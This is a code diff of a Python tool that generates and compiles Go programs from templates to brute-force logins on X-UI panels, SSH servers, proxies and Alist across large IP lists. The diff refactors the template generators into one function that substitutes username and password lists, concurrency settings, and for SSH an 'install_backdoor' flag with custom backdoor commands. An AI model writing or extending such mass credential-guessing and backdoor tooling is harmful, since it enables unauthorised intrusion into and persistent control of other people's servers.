+    "		fmt.Println(\"\\nGracefully shutting down...\")",
+    "		os.Exit(0)",
+    "	}()",
+    "    go memoryMonitor()",
+    "	batch, err := os.Open(inputFile)",
+    "	if err != nil { return }",
+    "	defer batch.Close()",
+    "	totalLines, _ := countLines(inputFile)",
+    "	go func() {",
+    "		ticker := time.NewTicker(500 * time.Millisecond)",
+    "		defer ticker.Stop()",
+    "		startTime := time.Now()",
+    "		for {",
+    "			current := atomic.LoadInt64(&completedCount)",
+    "			if totalLines > 0 {",
+    "				percentage := float64(current) / float64(totalLines) * 100",
+    "				bar := strings.Repeat(\"=\", int(percentage/2)) + strings.Repeat(\"-\", 50-int(percentage/2))",
+    "				elapsed := time.Since(startTime).Seconds()",
+    "				var eta float64",
+    "				if current > 0 {",
+    "					eta = (elapsed / float64(current)) * float64(int64(totalLines)-current)",
+    "				}",
+    "				fmt.Fprintf(os.Stdout, \"\\r[%s] %.2f%% (%d/%d) [%v<%v]\", bar, percentage, current, totalLines, ",
+    "					time.Duration(elapsed)*time.Second, time.Duration(eta)*time.Second)",
+    "			}",
+    "			if current >= int64(totalLines) {",
+    "				fmt.Fprintf(os.Stdout, \"\\n\")",
+    "				return",
+    "			}",
+    "			<-ticker.C",
+    "		}",
+    "	}()",
+    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
+    "	if err != nil { return }",
+    "	defer outFile.Close()",
+    "	tasks := make(chan string, {semaphore_size})",
+    "	var wg sync.WaitGroup",
+    "	for i := 0; i < {semaphore_size}; i++ {",
+    "		wg.Add(1)",
+    "		go worker(tasks, outFile, &wg)",
+    "	}",
+    "	scanner := bufio.NewScanner(batch)",
+    "	for scanner.Scan() {",
+    "        for atomic.LoadInt32(&isMemoryThrottled) == 1 { time.Sleep(250 * time.Millisecond) }",
+    "		line := strings.TrimSpace(scanner.Text())",
+    "		if line != \"\" {",
+    "			fields := strings.Fields(line)",
+    "			if len(fields) > 0 {",
+    "				tasks <- fields[0]",
+    "			}",
+    "		}",
+    "	}",
+    "	close(tasks)",
+    "	wg.Wait()",
+    "}",
+]
 
 # =========================== ipcx.py 内容 (增加tqdm风格进度条和批量查询) ===========================
 IPCX_PY_CONTENT = r"""import requests
@@ -1772,100 +1780,35 @@ def input_filename_with_default(prompt, default):
 def escape_go_string(s: str) -> str:
     return s.replace("\\", "\\\\").replace('"', '\\"')
 
-def generate_xui_go(semaphore_size, usernames, passwords, timeout, **kwargs):
+def generate_go_code(template_lines, semaphore_size, usernames, passwords, timeout, **kwargs):
     user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
     pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
-    code = XUI_GO_TEMPLATE_1.replace("{semaphore_size}", str(semaphore_size)) \
-                            .replace("{user_list}", user_list) \
-                            .replace("{pass_list}", pass_list) \
-                            .replace("{timeout}", str(timeout))
+    
+    code = "\n".join(template_lines)
+    code = code.replace("{semaphore_size}", str(semaphore_size)) \
+               .replace("{user_list}", user_list) \
+               .replace("{pass_list}", pass_list) \
+               .replace("{timeout}", str(timeout))
+
+    # For SSH template
+    if 'install_backdoor' in kwargs:
+        backdoor_flag = "true" if kwargs['install_backdoor'] else "false"
+        cmd_array = "[]string{" + ", ".join([f'"{escape_go_string(line)}"' for line in kwargs.get('custom_cmds', [])]) + "}"
+        code = code.replace("{enable_backdoor}", backdoor_flag) \
+                   .replace("{custom_backdoor_cmds}", cmd_array)
+
+    # For Proxy template
+    if 'proxy_type' in kwargs:
+        creds_list = "[]string{" + ", ".join([f'"{escape_go_string(line)}"' for line in kwargs.get('credentials', [])]) + "}"
+        code = code.replace("{proxy_type}", kwargs['proxy_type']) \
+                   .replace("{auth_mode}", str(kwargs.get('auth_mode', 0))) \
+                   .replace("{creds_list}", creds_list)
+
     with open('xui.go', 'w', encoding='utf-8') as f:
         f.write(code)
-
-def generate_xui_go_template2(semaphore_size, usernames, passwords, timeout, **kwargs):
-    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
-    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
-    code = XUI_GO_TEMPLATE_2.replace("{semaphore_size}", str(semaphore_size)) \
-                            .replace("{user_list}", user_list) \
-                            .replace("{pass_list}", pass_list) \
-                            .replace("{timeout}", str(timeout))
-    with open('xui.go', 'w', encoding='utf-8') as f:
-        f.write(code)
-
-def to_go_bool(val: bool) -> str:
-    return "true" if val else "false"
-
-def to_go_string_array_one_line(lines: list) -> str:
-    if not lines:
-        return "[]string{}"
-    return "[]string{" + ", ".join([f'"{escape_go_string(line)}"' for line in lines]) + "}"
-
-
-def generate_xui_go_template6(semaphore_size, usernames, passwords, timeout, install_backdoor, custom_cmds, **kwargs):
-    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
-    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
-    backdoor_flag = to_go_bool(install_backdoor)
-    cmd_array = to_go_string_array_one_line(custom_cmds)
-    code = XUI_GO_TEMPLATE_6.replace("{semaphore_size}", str(semaphore_size)) \
-                            .replace("{user_list}", user_list) \
-                            .replace("{pass_list}", pass_list) \
-                            .replace("{timeout}", str(timeout)) \
-                            .replace("{enable_backdoor}", backdoor_flag) \
-                            .replace("{custom_backdoor_cmds}", cmd_array)
-    with open('xui.go', 'w', encoding='utf-8') as f:
-        f.write(code)
-
-def generate_xui_go_template7(semaphore_size, usernames, passwords, timeout, **kwargs):
-    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
-    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
-    code = XUI_GO_TEMPLATE_7.replace("{semaphore_size}", str(semaphore_size)) \
-                            .replace("{user_list}", user_list) \
-                            .replace("{pass_list}", pass_list) \
-                            .replace("{timeout}", str(timeout))
-    with open('xui.go', 'w', encoding='utf-8') as f:
-        f.write(code)
-
-def generate_xui_go_template8(semaphore_size, usernames, passwords, timeout, **kwargs):
-    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
-    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
-    code = XUI_GO_TEMPLATE_8.replace("{semaphore_size}", str(semaphore_size)) \
-                            .replace("{user_list}", user_list) \
-                            .replace("{pass_list}", pass_list) \
-                            .replace("{timeout}", str(timeout))
-    with open('xui.go', 'w', encoding='utf-8') as f:
-        f.write(code)
-
-def generate_proxy_go(semaphore_size, auth_mode, proxy_type, timeout, usernames, passwords, credentials, **kwargs):
-    user_list = to_go_string_array_one_line(usernames)
-    pass_list = to_go_string_array_one_line(passwords)
-    creds_list = to_go_string_array_one_line(credentials)
-
-    code = PROXY_GO_TEMPLATE.replace("{semaphore_size}", str(semaphore_size)) \
-                            .replace("{auth_mode}", str(auth_mode)) \
-                            .replace("{proxy_type}", proxy_type) \
-                            .replace("{timeout}", str(timeout)) \
-                            .replace("{user_list}", user_list) \
-                            .replace("{pass_list}", pass_list) \
-                            .replace("{creds_list}", creds_list)
-    with open('xui.go', 'w', encoding='utf-8') as f:
-        f.write(code)
-
-def generate_alist_go(semaphore_size, timeout, **kwargs):
-    code = ALIST_GO_TEMPLATE.replace("{semaphore_size}", str(semaphore_size)) \
-                            .replace("{timeout}", str(timeout))
-    with open('xui.go', 'w', encoding='utf-8') as f:
-        f.write(code)
-
-def generate_ipcx_py():
-    with open('ipcx.py', 'w', encoding='utf-8') as f:
-        f.write(IPCX_PY_CONTENT)
 
 def split_file(input_file, lines_per_file):
-    """
-    **内存高效的文件分割**
-    此函数逐行读取输入文件（流式传输），而不是将整个文件加载到内存中。
-    这使得它能够以最小的内存使用量处理任何大小的文件（例如4000万个IP）。
-    """
+    # 内存高效的文件分割
     print(f"--- 正在以流式模式分割大文件 '{input_file}'... (这可能需要一些时间) ---")
     try:
         with open(input_file, 'r', encoding='utf-8', errors='ignore') as f_in:
@@ -2470,9 +2413,10 @@ def analyze_and_expand_scan(result_file, template_mode, params, template_map, ma
             current_params = params.copy()
             current_params['usernames'] = [user] if user else []
             current_params['passwords'] = [password] if password else []
-            gen_func, extra_args = template_map[template_mode]
-            final_params = {**current_params, **extra_args}
-            gen_func(**final_params)
+            
+            template_lines = template_map[template_mode]
+            generate_go_code(template_lines, **{**current_params, **params})
+
             executable_name = compile_go_program()
 
             try:
@@ -2621,16 +2565,15 @@ if __name__ == "__main__":
             os.makedirs(TEMP_HMFAIL_DIR, exist_ok=True)
 
         template_map = {
-            1: (generate_xui_go, {}), 2: (generate_xui_go_template2, {}),
-            6: (generate_xui_go_template6, {'install_backdoor': params.get('install_backdoor', False), 'custom_cmds': params.get('custom_cmds', [])}),
-            7: (generate_xui_go_template7, {}), 8: (generate_xui_go_template8, {}),
-            9: (generate_proxy_go, {'proxy_type': 'socks5'}), 10: (generate_proxy_go, {'proxy_type': 'http'}),
-            11: (generate_proxy_go, {'proxy_type': 'https'}), 12: (generate_alist_go, {}),
+            1: XUI_GO_TEMPLATE_1_LINES, 2: XUI_GO_TEMPLATE_2_LINES,
+            6: XUI_GO_TEMPLATE_6_LINES, 7: XUI_GO_TEMPLATE_7_LINES,
+            8: XUI_GO_TEMPLATE_8_LINES, 9: PROXY_GO_TEMPLATE_LINES,
+            10: PROXY_GO_TEMPLATE_LINES, 11: PROXY_GO_TEMPLATE_LINES,
+            12: ALIST_GO_TEMPLATE_LINES,
         }
 
-        gen_func, extra_args = template_map[TEMPLATE_MODE]
-        final_params = {**params, **extra_args}
-        gen_func(**final_params)
+        template_lines = template_map[TEMPLATE_MODE]
+        generate_go_code(template_lines, **params)
         
         executable = compile_go_program()
         
